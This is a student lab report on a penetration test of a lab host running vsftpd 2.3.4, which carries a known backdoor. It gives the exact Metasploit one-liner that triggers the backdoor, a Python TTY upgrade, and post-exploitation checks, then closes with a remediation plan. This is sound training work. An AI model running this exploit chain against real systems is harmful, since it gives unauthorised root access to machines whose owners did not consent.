# Security Assessment Report: Lab 4 - Exploitation & Post-Exploitation
**Environment:** Decentralized Academic Lab Network (Local Workstation Hosting)

## What We Did
Enumeration confirmed the target ran vsftpd version 2.3.4, which has a notorious backdoor (CVE-2011-2523). We started our vulnerability research by querying our local Exploit-DB archive using `searchsploit`. Once confirmed, we automated our attack delivery using Metasploit. We passed an execution string directly into `msfconsole` to load the module, set our target IP, and fire the exploit in a single command. The initial connection was a "dumb" shell, so we used Python to upgrade it to a fully interactive TTY. Once inside, we pulled system information and dumped the local password file as proof of access. We didn't even have to escalate privileges; checking our sudo rights showed we already had root.

## Commands & Flags
* `searchsploit vsftpd 2.3.4`
    * *No flags used.* Queries the local Kali Exploit-DB archive for known vulnerabilities and exploit modules matching the specific service version.
* `msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.56.103; exploit"`
    * `-q`: Quiet mode. Starts the Metasploit Framework without the ASCII art banner and startup text, speeding up our workflow.
    * `-x`: Execute command string. Instructs Metasploit to immediately run the provided semicolon-separated commands upon startup (loads the vsftpd backdoor module, sets the remote target IP, and launches the attack).
* `python -c 'import pty; pty.spawn("/bin/bash")'`
    * `-c`: Tells Python to execute the command string provided rather than opening an interactive interpreter. Spawns a stable pseudo-terminal.
* `uname -a`
    * `-a`: Prints all available system information (kernel name, network node hostname, kernel release, architecture).
* `sudo -l`
    * `-l`: Lists the allowed (and forbidden) sudo commands for the current user. Confirmed we had root privileges.

## The Results
We successfully validated the vulnerability, automated the exploit delivery to bypass authentication entirely, and secured a stable root shell. In a production environment, relying on this FTP service is a critical risk. 

**Remediation Plan:**
* **Patching:** Upgrade vsftpd to the latest patched release or uninstall it entirely if not required for business operations.
* **Protocol Migration:** Deprecate plain FTP (which sends data and credentials in cleartext) and replace it with secure SFTP.
* **Access Control:** Implement strict host-based firewall rules (iptables/ufw) to drop external connections to the backdoor's bind port (TCP 6200) and restrict Port 21 to trusted internal IPs.

![](./Images/msf_console.png)
